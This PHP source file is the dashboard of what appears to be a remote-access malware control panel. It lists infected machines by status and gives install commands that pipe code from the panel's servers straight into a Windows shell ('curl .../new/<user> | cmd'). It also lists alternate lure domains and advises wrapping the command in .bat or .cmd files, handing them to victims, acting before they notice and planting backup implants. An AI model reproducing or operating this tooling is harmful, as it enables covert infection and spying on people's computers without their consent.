<?php

use Kelvinho\Virus\Singleton\Header;
use Kelvinho\Virus\Singleton\HtmlTemplate;
use Kelvinho\Virus\Timezone\Timezone;
use Kelvinho\Virus\User\User;
use Kelvinho\Virus\Virus\Virus;
use Kelvinho\Virus\Virus\VirusFactory;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\formattedTimeSpan;
use function Kelvinho\Virus\niceFileSize;

function displayTable(array $virus_ids, array $visibleFields, VirusFactory $virusFactory, User $user, Timezone $timezoneObject) {
    $timezone = $user->getTimezone();
    if (count($virus_ids) === 0) { ?>
        <p>(No viruses)</p>
    <?php } else { ?>
        <div style="overflow: auto;" class="w3-card">
            <table class="w3-table w3-bordered w3-border w3-hoverable">
                <tr class="w3-white"><?php
                    echo in_array(0, $visibleFields) ? "<th>Name</th>" : "";
                    echo in_array(1, $visibleFields) ? "<th>Virus id</th>" : "";
                    echo in_array(2, $visibleFields) ? "<th>Last seen</th>" : "";
                    echo in_array(3, $visibleFields) ? "<th>Disk space</th>" : "";
                    echo in_array(4, $visibleFields) ? "<th></th>" : "";
                    ?>
                </tr>
                <?php foreach ($virus_ids as $blob) {
                    $virus = $virusFactory->get($blob["virus_id"]);
                    echo "<tr onclick = \"virusInfo('" . $virus->getVirusId() . "')\" style='cursor: pointer;' " . ($virus->isStandalone() ? "" : "class='w3-blue-grey w3-hover-dark-grey'") . ">";
                    echo in_array(0, $visibleFields) ? "<td>" . $virus->getName() . "</td>" : "";
                    echo in_array(1, $visibleFields) ? "<td>" . formattedHash($virus->getVirusId()) . "</td>" : "";
                    echo in_array(2, $visibleFields) ? "<td>" . $timezoneObject->display($timezone, $virus->getLastPing()) : "";
                    echo in_array(3, $visibleFields) ? "<td>" . niceFileSize($virus->usage()->getStatic()) . "</td>" : "";
                    echo in_array(4, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteVirus('" . $virus->getVirusId() . "')\">Delete</button></td>" : "";
                    echo "</tr>";
                } ?>
            </table>
        </div>
    <?php }
}

if (!$authenticator->authenticated()) {
    header("Location: " . DOMAIN . "/login");
    Header::redirect();
}

$user_handle = $session->get("user_handle");
$user = $userFactory->get($user_handle);
$alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "rocket", "trump", "obama", "food"];
?>
<html lang="en_US">
<head>
    <title>Dashboard</title>
    <?php HtmlTemplate::header(); ?>
    <style>
        .codes {
            color: midnightblue;
        }
    </style>
</head>
<body>
<?php HtmlTemplate::topNavigation(null, null, null, null, $user->isHold()); ?><?php
if ($user->isHold()) { ?>
    <p><span style="color: red;">You are currently holding, meaning you can't install new viruses</span></p>
<?php } ?>
<h2>Active viruses</h2>
<p>These are viruses that are still reporting back pretty quickly (less
    than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
<?php displayTable($user->getViruses(Virus::VIRUS_ACTIVE), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
<h2>Dormant viruses</h2>
<p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
    than 2 days</p>
<?php displayTable($user->getViruses(Virus::VIRUS_DORMANT), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
<h2>Lost viruses</h2>
<p>These are viruses that don't report back for more than 2 days</p>
<?php displayTable($user->getViruses(Virus::VIRUS_LOST), [0, 1, 2, 3, 4], $virusFactory, $user, $timezone); ?>
<h2>Expecting viruses</h2>
<p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
    triggered by accessing the entry point.</p>
<?php displayTable($user->getViruses(Virus::VIRUS_EXPECTING), [0, 1, 3, 4], $virusFactory, $user, $timezone); ?>
<h2>Installing a new virus</h2>
To install a new virus on a Windows computer, execute this command in the command prompt on the target machine:
<pre class="codes"
     style="overflow: auto;">curl <?php echo ALT_DOMAIN_SHORT; ?>/new/<?php echo $user_handle; ?> | cmd</pre>
And run this for Mac (in development, not available):
<pre class="codes" style="overflow: auto;">curl <?php echo ALT_DOMAIN_SHORT; ?>/new/mac/<?php echo $user_handle; ?> | cmd</pre>
<p>The "|" character, known as the vertical bar, normally sits <!--suppress HtmlUnknownTarget --> <a
            href="/resources/images/normal_vertical_bar.png" target=_blank style="color: blue;">right above the enter
        button</a>. Some keyboards denote it with <!--suppress HtmlUnknownTarget --><a
            href="/resources/images/split_vertical_bar.jpg" target=_blank style="color: blue;">2 vertical bars align
        end-to-end</a></p>
<p>Instantaneously after you have run that command, you should be able to see that virus pops up in the list of
    expecting viruses. After a few seconds, the virus will pings back for the first time, and will jump to the active
    viruses category. If this doesn't happen, then something has gone wrong and I have no idea how to fix it. May be the
    target machine has an antivirus? :D</p>
<p>I recommend you memorize the above command because when you are actually attacking them, you need to do it
    quickly, before they can notice anything. I also recommend installing 1 initial virus on a target machine, then
    install a new one that acts as a backup.</p>
<h3>Alternate: Using a file</h3>
<p>You can put the command above in a file, then name the file so that it has extension .cmd or .bat, which ever you
    prefer, then give your target that file and tell them to run it.</p>
<h3>Alternate: Using your own domain</h3>
<p>Let's say you have your own domain "awesome.app.com". You can then redirect it to the command above (this is hard if
    you don't know what you're doing). Then the command to install will now be:</p>
<pre class="codes"
     style="overflow: auto;">curl -L awesome.app.com | cmd</pre>
<h3>Alternate: Using alternate addresses I created</h3>
<p>You can use any of these alternate addresses, if you don't agree with using <?php echo ALT_DOMAIN_SHORT; ?></p>
<div style="overflow: auto;">
    <?php foreach ($alternates as $alternate) { ?>
        <pre class="codes">curl <?php echo $alternate; ?>.kelvinho.org/new/<?php echo $user_handle; ?> | cmd</pre>
    <?php } ?>
</div>
<p>Same goes for the mac install command.</p>
<p>I can definitely add more, but what's the point? Also, note that <?php echo DOMAIN; ?> is the main site, and is
    accessible encrypted only. Any insecure requests will be redirected to the secure site. However, all of the
    alternative built-in domains are unencrypted just because I'm lazy, and they are meant to install the virus only, so
    what's the point of encryption?</p>
<h3>Alternate: Rebuild this entire application and control your own data</h3>
<p>If you don't agree that I control your spying data then you can rebuild everything here. The project is open sourced
    (under the MIT license) and available <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue">here</a>. The
    installation details are way too technical here, but there're plenty of guide on the github page.</p>
<p>One last bit of advice: test everything locally first, on either your machine or a VM, then actually getting out
    to attack. The chance for attacking is very small, and you wouldn't want to have a chance and it doesn't get
    installed properly do you?</p>
<h2>Frequently Asked Questions</h2>
<p>Have a question? Head over to the <a href="<?php echo DOMAIN . "/faq"; ?>" style="color: blue;">Frequently Asked Questions site</a>.</p>
</body>
<?php HtmlTemplate::scripts(); ?>
<!--suppress EqualityComparisonWithCoercionJS -->
<script type="application/javascript">
    let clickHold = false; // prevent the delete button click from triggering the tr click

    let ctrlIsPressed = false;
    $(document).keydown(event => (event.which == "17" ? (ctrlIsPressed = true) : 0));
    $(document).keyup(() => ctrlIsPressed = false);

    function virusInfo(virus_id) {
        if (clickHold) {
            clickHold = false;
            return;
        }
        if (ctrlIsPressed) {
            window.open("<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id, "_blank");
        } else {
            window.location = "<?php echo DOMAIN . "/ctrls/viewVirus?vrs="; ?>" + virus_id;
        }
    }

    function deleteVirus(virus_id) {
        console.log("delete, " + virus_id);
        clickHold = true;
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteVirus",
            type: "POST",
            data: {
                virus_id: virus_id
            },
            success: () => window.location = "<?php echo DOMAIN; ?>"
        });
    }

    function removeHold() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/removeHold",
            type: "POST",
            success: () => window.location = "<?php echo DOMAIN . "/dashboard"; ?>"
        });
    }

    function applyHold() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/applyHold",
            type: "POST",
            success: () => window.location = "<?php echo DOMAIN . "/dashboard"; ?>"
        });
    }

    setInterval(() => location.reload(true), 60000);

    //document.body.requestFullscreen();
    window.scrollTo(0, 1);
</script>
</html>
